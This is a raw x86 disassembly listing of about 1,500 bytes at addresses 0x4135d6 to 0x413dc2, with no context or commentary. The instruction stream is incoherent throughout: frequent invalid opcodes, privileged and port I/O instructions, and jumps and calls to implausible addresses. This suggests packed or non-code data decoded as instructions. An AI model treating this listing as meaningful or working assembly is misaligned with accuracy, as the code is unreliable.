  4135d6:	xor    eax,0xce08b672
  4135db:	ins    BYTE PTR es:[edi],dx
  4135dc:	jmp    FWORD PTR [eax]
  4135de:	push   ds
  4135df:	cs ins DWORD PTR es:[edi],dx
  4135e1:	xor    ecx,DWORD PTR [esi+0x44b85326]
  4135e7:	or     edx,DWORD PTR [eax]
  4135e9:	test   al,0xed
  4135eb:	adc    dl,bh
  4135ed:	add    bh,BYTE PTR [ecx]
  4135ef:	fs aaa 
  4135f1:	push   ebp
  4135f2:	sbb    eax,0x8f777a98
  4135f7:	xchg   ebx,eax
  4135f8:	pop    ds
  4135f9:	push   ebp
  4135fa:	icebp  
  4135fb:	xchg   ebp,eax
  4135fc:	lock je 0x4135d8
  4135ff:	shl    BYTE PTR [edi+0x15],1
  413602:	adc    eax,0xb8002f99
  413607:	xor    al,0xcb
  413609:	xor    eax,DWORD PTR [edi+esi*1]
  41360c:	jb     0x4135c3
  41360e:	dec    ecx
  41360f:	loope  0x413609
  413611:	in     eax,0x4c
  413613:	(bad)  
  413614:	(bad)  
  413615:	jns    0x413604
  413617:	and    al,0x1f
  413619:	dec    ebp
  41361a:	loope  0x4135a9
  41361c:	lods   eax,DWORD PTR ds:[esi]
  41361d:	fcomp  QWORD PTR [ecx-0x29]
  413620:	(bad)  
  413621:	in     eax,0x68
  413623:	into   
  413624:	bound  ebx,QWORD PTR [eax+0x4d]
  413627:	std    
  413628:	inc    esp
  413629:	adc    al,0xa8
  41362b:	inc    ebp
  41362c:	add    esi,DWORD PTR [eax+ebp*4]
  41362f:	cmp    eax,0x90410d00
  413634:	dec    esp
  413635:	add    eax,0xcd549055
  41363a:	push   esi
  41363b:	add    BYTE PTR [ebp+eax*8+0x22],0x3e
  413640:	push   ebx
  413641:	cmp    DWORD PTR [eax-0x39],ebp
  413644:	call   0xfe183601
  413649:	jb     0x413664
  41364b:	sub    eax,0x82821638
  413650:	into   
  413651:	(bad)  
  413652:	in     eax,dx
  413653:	loope  0x4135f6
  413655:	js     0x413623
  413657:	(bad)  
  413658:	cmp    DWORD PTR [esi+edx*2],ebp
  41365b:	adc    ecx,DWORD PTR [ecx+0x391116a5]
  413661:	outs   dx,DWORD PTR ds:[esi]
  413662:	push   ecx
  413663:	or     eax,0x1017e900
  413668:	add    DWORD PTR [edi+0xd3d00],0x185d32e9
  413672:	hlt    
  413673:	xor    cl,BYTE PTR [eax+eax*1]
  413676:	jmp    0x26c24289
  41367b:	xor    ebx,DWORD PTR [ebp+0x17]
  41367e:	fdiv   QWORD PTR [edx]
  413680:	push   esp
  413681:	add    cl,ch
  413683:	(bad)  
  413684:	or     eax,DWORD PTR [ecx+0xb5d300e]
  41368a:	sahf   
  41368b:	add    al,BYTE PTR [edx-0x1787ee32]
  413691:	std    
  413692:	test   BYTE PTR [ecx],0xd6
  413695:	jmp    0x24a60063
  41369a:	stc    
  41369b:	aas    
  41369c:	fdivr  st,st(5)
  41369e:	jmp    0x312b8d5
  4136a3:	cld    
  4136a4:	cmp    dl,BYTE PTR [ebx+0x62]
  4136a7:	fsubr  st(0),st
  4136a9:	lds    eax,FWORD PTR [eax]
  4136ab:	push   es
  4136ac:	in     eax,dx
  4136ad:	sti    
  4136ae:	inc    ebp
  4136af:	mov    edi,DWORD PTR [ebp+0x52f574fd]
  4136b5:	ins    BYTE PTR es:[edi],dx
  4136b6:	and    al,0xe8
  4136b8:	push   eax
  4136b9:	inc    esp
  4136ba:	and    al,0x3c
  4136bc:	dec    edx
  4136bd:	dec    eax
  4136be:	mov    DWORD PTR [ecx+ebp*1],esi
  4136c1:	pop    eax
  4136c2:	cmp    esp,DWORD PTR [eax-0x3f488024]
  4136c8:	in     al,dx
  4136c9:	sti    
  4136ca:	test   DWORD PTR [edi+0x9c81dc],esi
  4136d0:	enter  0xb,0x83
  4136d4:	inc    edi
  4136d5:	or     ecx,DWORD PTR [ebx]
  4136d7:	xchg   BYTE PTR [ebx+0xc],bl
  4136da:	add    BYTE PTR [eax],al
  4136dc:	inc    ebx
  4136dd:	and    BYTE PTR [eax+edx*1],ah
  4136e0:	jg     0x413732
  4136e2:	mov    edi,0x4d3c5f2b
  4136e7:	mov    eax,DWORD PTR [esi-0x4c]
  4136ea:	sub    ebp,esi
  4136ec:	imul   esp
  4136ee:	xchg   DWORD PTR [esp+ebp*1+0x25],edx
  4136f2:	push   ebx
  4136f3:	push   edx
  4136f4:	adc    ebx,DWORD PTR [esi+0xaf0e887]
  4136fa:	in     eax,dx
  4136fb:	call   DWORD PTR [edi+0x21]
  4136fe:	sar    DWORD PTR [edi-0x33],0x50
  413702:	inc    esp
  413703:	and    al,0x80
  413705:	and    BYTE PTR [esi+0xb4c24],al
  41370b:	jne    0x41376e
  41370d:	mov    BYTE PTR [esi+0xb4c28],bh
  413713:	add    ah,cl
  413715:	add    edi,DWORD PTR [ecx]
  413717:	add    BYTE PTR [ebp+0xb],cl
  41371a:	add    BYTE PTR [ebp+ecx*2-0x72],bh
  41371e:	sti    
  41371f:	add    bl,ah
  413721:	and    BYTE PTR [ecx],bh
  413723:	add    BYTE PTR [ecx],dh
  413725:	cmp    eax,0xeda50004
  41372a:	xchg   ch,bh
  41372c:	xor    dl,BYTE PTR [esp+edi*8]
  41372f:	push   esp
  413730:	sbb    DWORD PTR [ebx-0x2e],0x917800e8
  413737:	loope  0x413736
  413739:	sbb    bl,bh
  41373b:	inc    eax
  41373c:	pop    ecx
  41373d:	pop    esi
  41373e:	arpl   sp,cx
  413740:	std    
  413741:	push   edi
  413742:	arpl   ax,cx
  413744:	cmp    bl,dh
  413746:	fadd   DWORD PTR [ecx]
  413748:	mov    DWORD PTR [ebp-0x34],edx
  41374b:	icebp  
  41374c:	mov    dl,dh
  41374e:	mov    ebx,0x5b7c50ca
  413753:	shr    al,cl
  413755:	cs mov fs,ecx
  413758:	std    
  413759:	ins    BYTE PTR es:[edi],dx
  41375a:	arpl   cx,si
  41375c:	inc    DWORD PTR [ebp+0x3d]
  41375f:	in     eax,dx
  413760:	adc    BYTE PTR [edx-0x43efda64],ch
  413766:	stos   DWORD PTR es:[edi],eax
  413767:	loop   0x4137b8
  413769:	add    ebp,DWORD PTR [ebx-0x2e]
  41376c:	call   0xfe2275a7
  413771:	stos   BYTE PTR es:[edi],al
  413772:	xchg   esp,eax
  413773:	and    eax,0x1e1cc54
  413778:	add    BYTE PTR [ecx],dh
  41377a:	fcmovnb st,st(2)
  41377c:	jno    0x4137ce
  41377e:	pop    ebp
  41377f:	jge    0x413781
  413781:	xor    eax,esp
  413783:	add    DWORD PTR [ecx+0x5d4b7],ecx
  413789:	xor    DWORD PTR [ebx-0x79076cf],edx
  41378f:	out    0xeb,al
  413791:	push   esi
  413792:	xlat   BYTE PTR ds:[ebx]
  413793:	add    al,0xae
  413795:	and    eax,0x1e4
  41379a:	xor    al,BYTE PTR ds:0x8c3dd1d
  4137a0:	int3   
  4137a1:	xchg   BYTE PTR [eax-0x2a],ch
  4137a4:	call   0xe74e852a
  4137a9:	add    edi,DWORD PTR [edx+0x4658e041]
  4137af:	sub    BYTE PTR [ebp-0xd],0x32
  4137b3:	or     edi,esp
  4137b5:	mov    WORD PTR [edi+0x3103eaf0],?
  4137bb:	dec    ecx
  4137bc:	pusha  
  4137bd:	xchg   ecx,eax
  4137be:	sbb    eax,0xae03e70d
  4137c3:	mov    ?,edi
  4137c5:	pop    es
  4137c6:	xor    DWORD PTR [ecx],ecx
  4137c8:	bound  ecx,QWORD PTR [ecx+0x3e70d49]
  4137ce:	stos   DWORD PTR es:[edi],eax
  4137cf:	clc    
  4137d0:	call   0x700c0f8a
  4137d5:	repz iret 
  4137d7:	jae    0x4137ac
  4137d9:	pop    es
  4137da:	xor    DWORD PTR [ecx],ecx
  4137dc:	hlt    
  4137dd:	cld    
  4137de:	test   eax,0x3107f78e
  4137e3:	or     DWORD PTR [eax-0x77],esi
  4137e6:	dec    ecx
  4137e7:	or     eax,0x7ff103e7
  4137ec:	pop    ebp
  4137ed:	push   DWORD PTR [edx]
  4137ef:	or     edi,esp
  4137f1:	mov    WORD PTR [edi+0x3103e2f8],gs
  4137f7:	sub    BYTE PTR [ebp-0x5],0x32
  4137fb:	or     edi,esp
  4137fd:	lea    eax,[eax]
  4137ff:	and    DWORD PTR [ebx],ecx
  413801:	cmp    ecx,esp
  413803:	jae    0x413785
  413805:	test   DWORD PTR [edi+ecx*8],0x3103eaf4
  41380c:	pop    esp
  41380d:	lock mov ?,WORD PTR [edi+0x3103eaf8]
  413814:	and    BYTE PTR [ebp-0x5],0x32
  413818:	or     DWORD PTR [eax],eax
  41381a:	jmp    0xcdcfc611
  41381f:	or     DWORD PTR ss:[eax],eax
  413822:	jo     0x4137cf
  413824:	clc    
  413825:	add    ebp,ecx
  413827:	xor    al,BYTE PTR [edx+0x92ef186]
  41382d:	add    BYTE PTR [ecx-0x26797dab],bh
  413833:	or     DWORD PTR cs:[eax],eax
  413836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413837:	xor    eax,0x31678909
  41383c:	or     eax,0x8bade900
  413841:	sbb    ch,ch
  413843:	xor    cl,BYTE PTR [ecx]
  413845:	dec    DWORD PTR [esi-0x1b]
  413848:	or     BYTE PTR [eax],al
  41384a:	jmp    0xca13f864
  41384f:	lods   eax,DWORD PTR ds:[esi]
  413850:	dec    ebp
  413851:	and    al,0x25
  413853:	scas   al,BYTE PTR es:[edi]
  413854:	leave  
  413855:	je     0x41380f
  413857:	mov    ebp,0xb4092445
  41385c:	jnp    0x41386e
  41385e:	in     eax,0x32
  413860:	or     DWORD PTR [ecx],ebp
  413862:	mov    ebp,0x4f390e00
  413867:	jb     0x41382c
  413869:	std    
  41386a:	add    ebp,ecx
  41386c:	xor    ah,BYTE PTR [edx]
  41386e:	dec    esp
  41386f:	add    eax,0x9e4f3765
  413874:	xchg   ecx,eax
  413875:	mov    ecx,0x87852581
  41387a:	sar    BYTE PTR [esi+esi*1+0x3c2a8930],0x36
  413882:	pop    esi
  413883:	push   0x69
  413885:	adc    edx,eax
  413887:	add    DWORD PTR ds:0x2ef98682,esi
  41388d:	or     DWORD PTR [eax],eax
  41388f:	ret    0x2cf6
  413892:	push   eax
  413893:	add    BYTE PTR [ebp-0x24a1a4eb],cl
  413899:	sar    BYTE PTR [eax],0xc2
  41389c:	pusha  
  41389d:	or     BYTE PTR [eax+0x64800],bh
  4138a3:	ret    
  4138a4:	ret    
  4138a5:	dec    ebx
  4138a6:	and    al,0x4
  4138a8:	mov    ds:0x1be9bdc0,eax
  4138ad:	add    DWORD PTR [eax+ecx*1+0x48],0xffffffce
  4138b2:	xchg   DWORD PTR [esp-0x7],eax
  4138b6:	jl     0x4138a4
  4138b8:	cmp    al,0x1
  4138ba:	add    BYTE PTR [eax],al
  4138bc:	xchg   ebp,eax
  4138bd:	enter  0x771,0x89
  4138c1:	int3   
  4138c2:	sub    al,0x4
  4138c4:	or     BYTE PTR [eax],cl
  4138c6:	mov    edi,0x2c5c008b
  4138cb:	inc    esp
  4138cc:	add    al,0xd8
  4138ce:	pop    es
  4138cf:	xchg   DWORD PTR [esp+esi*8-0x37fffbb9],edx
  4138d6:	push   ss
  4138d7:	xchg   DWORD PTR [esp+esi*8-0x27fffbb9],ecx
  4138de:	sbb    eax,0xf3f49487
  4138e3:	add    eax,DWORD PTR [eax]
  4138e5:	enter  0x5016,0x8b
  4138e9:	adc    al,0x2c
  4138eb:	inc    eax
  4138ec:	add    al,0x98
  4138ee:	pop    es
  4138ef:	push   edx
  4138f0:	push   eax
  4138f1:	std    
  4138f2:	inc    ebx
  4138f3:	and    al,0x18
  4138f5:	add    BYTE PTR [eax],bl
  4138f7:	icebp  
  4138f8:	dec    DWORD PTR [edi-0x79]
  4138fb:	les    ebp,FWORD PTR [esp+edx*4]
  4138fe:	pop    es
  4138ff:	add    bl,al
  413901:	sbb    al,0xc4
  413903:	int3   
  413904:	int3   
  413905:	cmp    al,0xc4
  413907:	int3   
  413908:	int3   
  413909:	sbb    al,0xc4
  41390b:	int3   
  41390c:	int3   
  41390d:	xor    DWORD PTR [ebp-0x2a4f1c76],edx
  413913:	rol    BYTE PTR [eax],cl
  413915:	xor    edx,esp
  413917:	xor    al,0x56
  413919:	out    0x56,al
  41391b:	or     BYTE PTR ss:[eax],al
  41391e:	test   DWORD PTR [edi],0x576582b6
  413924:	aas    
  413925:	xor    DWORD PTR [ecx-0x2c],ebx
  413928:	mov    edi,0xb60ee029
  41392d:	add    BYTE PTR ds:0xb2ef8cd0,ch
  413933:	rol    DWORD PTR ds:0xb5cde0d,0xc
  41393a:	xchg   DWORD PTR [ecx],esp
  41393c:	add    al,0x83
  41393e:	stc    
  41393f:	jmp    0x4139b9
  413941:	iret   
  413942:	cs pop edx
  413944:	ret    
  413945:	mov    BYTE PTR [ebp+0xd],ch
  413948:	int3   
  413949:	inc    ecx
  41394a:	mov    dl,0xa7
  41394c:	sbb    al,0x7c
  41394e:	add    BYTE PTR [edx+0x5b266af],dh
  413954:	adc    bh,bh
  413956:	pop    ebp
  413957:	(bad)  
  413958:	mov    eax,ss
  41395a:	(bad)  
  41395b:	test   al,0x8f
  41395d:	dec    esp
  41395e:	xor    DWORD PTR [edx-0x4b53fe16],edi
  413964:	out    dx,eax
  413965:	mov    bh,BYTE PTR [eax]
  413967:	loope  0x4138eb
  413969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41396a:	in     al,dx
  41396b:	rcr    dh,1
  41396d:	std    
  41396e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41396f:	loopne 0x4138f3
  413971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413972:	lods   al,BYTE PTR ds:[esi]
  413973:	rcr    dh,1
  413975:	std    
  413976:	xchg   esi,eax
  413977:	loopne 0x41398d
  413979:	fnstcw WORD PTR [esi]
  41397b:	pop    edx
  41397c:	xor    BYTE PTR [edi+edi*8+0x458b01a0],0xb8
  413984:	cmp    dh,0x15
  413987:	or     DWORD PTR [ecx+ecx*1-0x342bb245],esp
  41398e:	mov    ecx,0x73f44d
  413993:	dec    eax
  413994:	add    DWORD PTR [ecx+0x48],esp
  413997:	and    ah,BYTE PTR [ebp+0x792a486f]
  41399d:	stos   BYTE PTR es:[edi],al
  41399e:	or     BYTE PTR [eax-0xb],0x72
  4139a2:	mov    esp,0x3e6f578
  4139a7:	xor    DWORD PTR [edx],eax
  4139a9:	popf   
  4139aa:	and    ebp,0xba04285a
  4139b0:	sbb    al,0xef
  4139b2:	sbb    BYTE PTR [edi],0x11
  4139b5:	dec    esp
  4139b6:	or     ch,BYTE PTR [ebx-0x463403b4]
  4139bc:	dec    esp
  4139bd:	fdiv   QWORD PTR [ebx+0x18]
  4139c0:	add    DWORD PTR [ecx+0x47],esp
  4139c3:	inc    edx
  4139c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139c5:	pop    edi
  4139c6:	inc    edi
  4139c7:	sbb    bh,BYTE PTR [ecx+0x2a]
  4139ca:	sub    eax,0x10
  4139cd:	sbb    edi,DWORD PTR [ebp-0x6a1951ea]
  4139d3:	mov    al,0xcc
  4139d5:	adc    eax,0x3893145
  4139da:	or     DWORD PTR [ecx-0x47f20cf8],esp
  4139e0:	or     al,0x54
  4139e2:	inc    DWORD PTR [eax+ecx*2-0x19]
  4139e6:	or     al,0xad
  4139e8:	xor    edi,0xffffffde
  4139eb:	lods   al,BYTE PTR ds:[esi]
  4139ec:	shr    esi,1
  4139ee:	xchg   ebp,eax
  4139ef:	mov    al,0xb4
  4139f1:	fld    QWORD PTR [ecx+esi*1-0x77]
  4139f5:	retf   
  4139f6:	or     BYTE PTR [eax],al
  4139f8:	ror    DWORD PTR [eax],0xbb
  4139fb:	or     eax,0xff5c0cb8
  413a00:	cld    
  413a01:	inc    edi
  413a02:	add    cl,ch
  413a04:	sub    eax,0x57d9bb8d
  413a09:	sar    ebp,cl
  413a0b:	stos   BYTE PTR es:[edi],al
  413a0c:	mov    bl,0xcf
  413a0e:	sbb    BYTE PTR [ebp+0x13814670],bl
  413a14:	bound  eax,QWORD PTR [esp+ecx*4]
  413a17:	shl    DWORD PTR [edi-0x2d],cl
  413a1a:	std    
  413a1b:	je     0x4139d6
  413a1d:	clc    
  413a1e:	cld    
  413a1f:	(bad)  
  413a20:	fs cmp al,ch
  413a23:	loopne 0x413a57
  413a25:	or     DWORD PTR [eax],eax
  413a27:	mov    ?,esp
  413a29:	das    
  413a2a:	xchg   ebp,edx
  413a2c:	outs   dx,BYTE PTR ds:[esi]
  413a2d:	retf   
  413a2e:	or     cl,ch
  413a30:	pop    edi
  413a31:	mov    bl,ah
  413a33:	push   0xe9008a21
  413a38:	xor    bh,BYTE PTR [edx]
  413a3a:	push   esi
  413a3b:	push   ds
  413a3c:	mov    eax,0x3e6c084c
  413a41:	mov    DWORD PTR [edi+0x932d9],esi
  413a47:	pusha  
  413a48:	lock mov al,al
  413a4b:	in     eax,dx
  413a4c:	mov    ecx,0x2d877f1a
  413a51:	or     esp,edi
  413a53:	jmp    0x6248224b
  413a58:	cmp    BYTE PTR [eax-0x1b],dl
  413a5b:	test   eax,0x93c00
  413a60:	test   al,0xcc
  413a62:	add    eax,DWORD PTR [edi]
  413a64:	ja     0x413a0e
  413a66:	adc    DWORD PTR [edi-0x7a],edi
  413a69:	sub    eax,0x73e9fc09
  413a6e:	fimul  WORD PTR [edx]
  413a70:	lock test BYTE PTR [eax-0x75189fce],cl
  413a77:	ret    0xa9e5
  413a7a:	adc    DWORD PTR [edi+0x0],edi
  413a7d:	inc    esp
  413a7f:	or     eax,DWORD PTR [eax]
  413a81:	cwde   
  413a82:	retf   
  413a83:	jmp    0x413a8b
  413a85:	xchg   ebx,eax
  413a86:	out    dx,al
  413a87:	test   BYTE PTR [esi],bh
  413a89:	adc    edi,edx
  413a8b:	jl     0x413a73
  413a8d:	pop    eax
  413a8e:	mov    esp,0xe719ffff
  413a93:	or     al,0x8b
  413a95:	arpl   WORD PTR [ecx-0x15f6c021],cx
  413a9b:	adc    BYTE PTR [ecx],cl
  413a9d:	push   ss
  413a9e:	sbb    BYTE PTR [eax],0x81
  413aa1:	cmp    eax,DWORD PTR ds:0xcb4803f0
  413aa7:	out    0x4,eax
  413aa9:	push   ecx
  413aaa:	mov    es,WORD PTR [ebp+0x7f99a132]
  413ab0:	ret    0x810c
  413ab3:	xor    BYTE PTR [ebx+0x3306ecee],al
  413ab9:	xchg   ecx,eax
  413aba:	stc    
  413abb:	inc    esp
  413abc:	sbb    eax,0x7
  413abf:	or     ecx,0x89873d00
  413ac5:	inc    ebp
  413ac6:	mov    BYTE PTR [eax+ebp*8],bl
  413ac9:	daa    
  413aca:	or     BYTE PTR [eax+eax*1],cl
  413acd:	pop    edi
  413ace:	jbe    0x413ae2
  413ad0:	test   esp,ebp
  413ad2:	and    eax,0x530004cb
  413ad7:	dec    eax
  413ad8:	and    al,0x4
  413ada:	cmp    BYTE PTR [eax],0x74
  413add:	inc    ecx
  413ade:	fadd   DWORD PTR [eax-0x773f76f6]
  413ae4:	ret    0x4b04
  413ae7:	int3   
  413ae8:	add    al,0x81
  413aea:	inc    edx
  413aeb:	mov    eax,0x39984174
  413af0:	out    dx,al
  413af1:	ret    0xb8c
  413af4:	xchg   DWORD PTR [ecx+esi*1-0x2],eax
  413af8:	pop    es
  413af9:	mov    edx,0x42b61d
  413afe:	mov    edx,0xb20a8ad9
  413b03:	and    DWORD PTR ds:0x82dd7381,eax
  413b09:	cli    
  413b0a:	jge    0x413aa1
  413b0c:	inc    edx
  413b0d:	add    bl,ah
  413b0f:	idiv   DWORD PTR [esi-0x756acefc]
  413b15:	jecxz  0x413b18
  413b17:	xchg   edx,eax
  413b18:	xor    BYTE PTR [ecx+0x5b88e9ec],cl
  413b1e:	cmp    eax,0xe3f83655
  413b23:	jno    0x413b0e
  413b25:	sbb    eax,0x1e23100
  413b2a:	push   0x4255bd
  413b2f:	mov    esp,0x1950dc1d
  413b34:	call   0x4387:0x13310004
  413b3b:	sbb    DWORD PTR [ecx],edx
  413b3d:	in     al,dx
  413b3e:	jo     0x413b71
  413b40:	loopne 0x413b43
  413b42:	pop    ecx
  413b43:	mov    eax,0x29c237bc
  413b48:	loopne 0x413b80
  413b4a:	mov    DWORD PTR [ebp+0x4],ebp
  413b4d:	or     al,0x89
  413b4f:	test   DWORD PTR [ebp+eax*1+0x920f087],edi
  413b56:	mov    dh,0x28
  413b58:	mov    eax,ds:0xeaa818e3
  413b5d:	mov    WORD PTR [edi+0x78fd771],?
  413b63:	lock xor esp,0xe692b08
  413b6a:	xchg   eax,esi
  413b6c:	and    BYTE PTR [ecx],cl
  413b6e:	mov    dh,0x38
  413b70:	or     DWORD PTR [eax],ebp
  413b72:	in     eax,0x39
  413b74:	add    dh,cl
  413b76:	mov    WORD PTR [ebx],gs
  413b78:	cmp    BYTE PTR [eax],0x87
  413b7b:	jae    0x413b82
  413b7d:	pusha  
  413b7e:	(bad)  
  413b7f:	icebp  
  413b80:	std    
  413b81:	jl     0x413b82
  413b83:	das    
  413b84:	lock outs dx,DWORD PTR ds:[esi]
  413b86:	vpaddw xmm7,xmm1,XMMWORD PTR [ebp+ecx*1+0x0]
  413b8c:	mov    dh,0xe8
  413b8e:	iret   
  413b8f:	mov    WORD PTR [ebx],?
  413b91:	sub    BYTE PTR [eax],0x44
  413b94:	xor    al,0x97
  413b96:	lock les edi,FWORD PTR [esi-0x7]
  413b9a:	loope  0x413ba9
  413b9c:	scas   al,BYTE PTR es:[edi]
  413b9d:	add    esp,DWORD PTR [eax-0x3b]
  413ba0:	icebp  
  413ba1:	std    
  413ba2:	cmp    al,0xd
  413ba4:	xchg   al,ch
  413ba6:	out    dx,eax
  413ba7:	push   cs
  413ba8:	sub    edi,esi
  413baa:	cmp    al,0x4
  413bac:	cs enter 0xe60,0x88
  413bb1:	retf   
  413bb2:	out    dx,eax
  413bb3:	add    eax,DWORD PTR [eax+0x29203382]
  413bb9:	and    BYTE PTR [ebx],0x20
  413bbc:	and    eax,0x19c4e982
  413bc1:	icebp  
  413bc2:	outs   dx,BYTE PTR ds:[esi]
  413bc3:	add    al,0x46
  413bc5:	sub    cl,0xc4
  413bc8:	or     ecx,edi
  413bca:	pop    esi
  413bcb:	add    al,0x36
  413bcd:	sub    cl,0xc4
  413bd0:	fld    DWORD PTR [eax]
  413bd2:	outs   dx,DWORD PTR ds:[esi]
  413bd3:	add    al,0x26
  413bd5:	xor    BYTE PTR [edx+0x6ab8b644],0xc5
  413bdc:	sub    eax,0x308be782
  413be1:	sub    cl,0xc4
  413be4:	f2xm1  
  413be6:	outs   dx,BYTE PTR ds:[esi]
  413be7:	add    al,0xfe
  413be9:	add    DWORD PTR [eax],0x10e0edeb
  413bef:	popa   
  413bf0:	add    BYTE PTR ds:0x6deb890e,dh
  413bf6:	loopne 0x413c00
  413bf8:	jno    0x413c2f
  413bfa:	push   cs
  413bfb:	mov    ebx,edi
  413bfd:	stos   BYTE PTR es:[edi],al
  413bfe:	mov    eax,0xcb4fe888
  413c03:	or     cl,ch
  413c05:	inc    ecx
  413c06:	xchg   bl,ah
  413c08:	push   0xffffff96
  413c0a:	cld    
  413c0b:	push   eax
  413c0c:	lahf   
  413c0d:	inc    ebx
  413c0e:	add    BYTE PTR [ebx-0x23],0xbf
  413c12:	cmp    DWORD PTR [eax],ecx
  413c14:	jb     0x413c72
  413c16:	or     BYTE PTR [ebx-0xf],0xaf
  413c1a:	inc    ebp
  413c1b:	add    al,0x60
  413c1d:	lahf   
  413c1e:	(bad)  
  413c1f:	jmp    0x80016209
  413c24:	or     bh,BYTE PTR [ebx]
  413c26:	cld    
  413c27:	or     al,0xee
  413c29:	and    eax,0x6d1787b6
  413c2e:	out    0x4,al
  413c30:	mov    eax,0xa8d68504
  413c35:	sbb    edi,edx
  413c37:	cs scas eax,DWORD PTR es:[edi]
  413c39:	stos   BYTE PTR es:[edi],al
  413c3a:	fidivr DWORD PTR [edi-0x36]
  413c3d:	clc    
  413c3e:	into   
  413c3f:	add    cl,ch
  413c41:	and    esi,DWORD PTR [edi+eax*4+0x10e3f2a7]
  413c48:	clc    
  413c49:	in     al,0x84
  413c4b:	into   
  413c4c:	test   al,0xb
  413c4e:	or     BYTE PTR [edi],ch
  413c50:	xchg   edi,eax
  413c51:	mov    edx,0x8a7fda
  413c56:	cmp    al,0x1a
  413c58:	xor    edx,ebx
  413c5a:	inc    ebx
  413c5b:	scas   eax,DWORD PTR es:[edi]
  413c5c:	xchg   DWORD PTR [edi-0x27fd1c0e],esi
  413c62:	jecxz  0x413be8
  413c64:	into   
  413c65:	add    BYTE PTR [ecx-0x59cef721],bl
  413c6b:	sub    bh,0x81
  413c6e:	stos   DWORD PTR es:[edi],eax
  413c6f:	mov    dl,0x0
  413c71:	call   FWORD PTR [eax-0x11762609]
  413c77:	(bad)  
  413c78:	out    0x8,al
  413c7a:	cmp    DWORD PTR [edi+0x7fc7585],edi
  413c80:	test   BYTE PTR [ebx-0x10424b83],0x8f
  413c87:	test   ebx,esp
  413c89:	add    DWORD PTR [ecx],eax
  413c8b:	mov    eax,0x9711f905
  413c90:	sub    eax,0x7db5d1ce
  413c95:	jecxz  0x413c99
  413c97:	fwait
  413c98:	stos   BYTE PTR es:[edi],al
  413c99:	stos   BYTE PTR es:[edi],al
  413c9a:	jns    0x413c2a
  413c9c:	sub    eax,0x11f8cdd9
  413ca1:	mov    DWORD PTR [edi],eax
  413ca3:	enter  0x1feb,0xdb
  413ca7:	jmp    0xff7bc5a9
  413cac:	stc    
  413cad:	mov    DWORD PTR [ebp+0x180008b0],0xd9ce8508
  413cb7:	jmp    0xcf41c5d8
  413cbc:	(bad)  
  413cbd:	jmp    0x413cc3
  413cbf:	xchg   ecx,eax
  413cc0:	mov    ch,0x5
  413cc2:	sti    
  413cc3:	xchg   ecx,eax
  413cc4:	retf   0xc07f
  413cc7:	adc    al,0xf5
  413cc9:	sbb    eax,0xe6849e89
  413cce:	aas    
  413ccf:	xchg   ebx,eax
  413cd0:	cld    
  413cd1:	mov    al,0xf4
  413cd3:	sbb    al,0x48
  413cd5:	add    BYTE PTR [ecx+0x6ebc6ef],cl
  413cdb:	dec    ecx
  413cdc:	jmp    0xe2723ddd
  413ce1:	add    DWORD PTR [ecx],ecx
  413ce3:	xchg   BYTE PTR [ebp+0x5b],dh
  413ce6:	aas    
  413ce7:	xor    DWORD PTR [ecx-0x48],ebx
  413cea:	mov    edi,0xe582dbce
  413cef:	mov    ch,0xe1
  413cf1:	add    DWORD PTR [eax],eax
  413cf3:	cmp    dl,BYTE PTR [ebx]
  413cf5:	int    0x78
  413cf7:	lock loope 0x413c84
  413cfa:	fnsave [eax+0x3a]
  413cfd:	out    dx,eax
  413cfe:	jle    0x413c8e
  413d00:	xor    eax,0xe7310001
  413d05:	nop
  413d06:	hlt    
  413d07:	jmp    DWORD PTR [eax+0x16048701]
  413d0d:	mov    al,dh
  413d0f:	mov    dl,0x21
  413d11:	std    
  413d12:	xchg   BYTE PTR [edx-0x32],bh
  413d15:	test   DWORD PTR [esi+0x3ddf5e87],0xf48eb5aa
  413d1f:	add    ah,dl
  413d21:	mov    al,ds:0xf5c40901
  413d26:	mov    ebp,ebx
  413d28:	jo     0x413d1c
  413d2a:	(bad)  
  413d2b:	jle    0x413d83
  413d2d:	int    0x2
  413d2f:	add    BYTE PTR [ecx],dh
  413d31:	out    0x90,eax
  413d33:	hlt    
  413d34:	stos   BYTE PTR es:[edi],al
  413d35:	mov    eax,ds:0xa2068701
  413d3a:	in     eax,0xe
  413d3c:	mov    al,0xc3
  413d3e:	fadd   DWORD PTR [eax]
  413d40:	xor    eax,esp
  413d42:	or     dh,BYTE PTR [ebp+0x433a05]
  413d48:	mov    eax,0x27edc3a3
  413d4d:	popa   
  413d4e:	(bad)  
  413d50:	xor    eax,esp
  413d52:	add    DWORD PTR [ecx],ecx
  413d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d55:	xchg   esp,eax
  413d56:	dec    ebp
  413d57:	aas    
  413d58:	xor    DWORD PTR [ecx],ecx
  413d5a:	fcom   st(1)
  413d5c:	mov    dh,0xb3
  413d5e:	test   al,0xde
  413d60:	xor    eax,0xdcc5be80
  413d65:	add    eax,0xce2ed360
  413d6a:	jo     0x413d2a
  413d6c:	mov    al,0xc9
  413d6e:	jecxz  0x413d82
  413d70:	pop    ss
  413d71:	adc    BYTE PTR [ebp+0x620a9783],0x10
  413d78:	loop   0x413d4f
  413d7a:	jecxz  0x413dc0
  413d7c:	xor    DWORD PTR [eax+0x384c53e],eax
  413d82:	push   0x98d00df
  413d87:	out    0x3,eax
  413d89:	cmp    BYTE PTR [edx+0x93e5a3b],dl
  413d8f:	jo     0x413d48
  413d91:	mov    dh,0xda
  413d93:	in     eax,0x84
  413d95:	push   esp
  413d96:	int    0xe7
  413d98:	add    esi,DWORD PTR [ecx]
  413d9a:	(bad)  
  413d9b:	pop    ebp
  413d9c:	rcr    cl,1
  413d9e:	inc    edi
  413d9f:	out    0x8c,eax
  413da1:	je     0x413d6b
  413da3:	push   es
  413da4:	out    dx,al
  413da5:	iret   
  413da6:	loope  0x413db3
  413da8:	add    al,0x31
  413daa:	or     edx,esi
  413dac:	mov    es,WORD PTR [ebp+0x53]
  413daf:	test   al,0x3
  413db1:	scas   al,BYTE PTR es:[edi]
  413db2:	push   esp
  413db3:	sti    
  413db4:	mov    edi,?
  413db6:	test   DWORD PTR [edi],esp
  413db8:	add    BYTE PTR [esi-0x4809e54b],ch
  413dbe:	stos   BYTE PTR es:[edi],al
  413dbf:	push   0xffffffdd
  413dc1:	push   esp
  413dc2:	jle    0x413ddf
